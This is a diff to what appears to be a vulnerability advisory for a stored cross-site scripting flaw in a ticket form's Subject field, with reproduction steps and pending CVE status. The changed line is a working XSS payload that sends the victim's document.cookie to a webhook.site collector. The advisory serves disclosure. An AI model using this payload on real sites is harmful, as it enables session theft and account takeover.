@@ -36,7 +36,7 @@ An attacker can exploit this flaw by injecting malicious JavaScript code into th
    (If the site allows public submissions, no authentication is required. Otherwise, log in as a low-privileged user.)
 
 2. In the **Subject** field of the ticket form, insert the following payload:
-<img src=x onerror="(new Image).src='https://webhook.site/3bdce340-f98e-4d53-9d40-f93c94df619a?c='+encodeURIComponent(document.cookie)">
+"<img src=x onerror="(new Image).src='https://webhook.site/3bdce340-f98e-4d53-9d40-f93c94df619a?c='+encodeURIComponent(document.cookie)">"
 
 3. Submit the ticket.
 
@@ -73,6 +73,8 @@ Pending — Vendor response.
 Pending — CVE assignment.
 
 ## References
+
 CWE-79: https://cwe.mitre.org/data/definitions/79.html
+
 OWASP XSS Prevention Cheat Sheet: https://owasp.org/www-community/xss-prevention
 
